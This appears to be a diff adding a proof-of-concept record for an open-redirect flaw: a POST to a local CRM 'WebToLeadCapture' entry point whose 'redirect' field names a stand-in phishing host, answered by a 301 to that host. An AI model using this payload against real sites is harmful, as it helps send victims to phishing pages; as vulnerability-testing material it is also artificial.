@@ -1,0 +1,5 @@
+request: POST http://localhost:33116/index.php?entryPoint=WebToLeadCapture
+body: {'redirect': 'https://evil-cvehunter-w2l_4aac3760.example/phish'}
+
+response status: 301
+Location: https://evil-cvehunter-w2l_4aac3760.example/phish
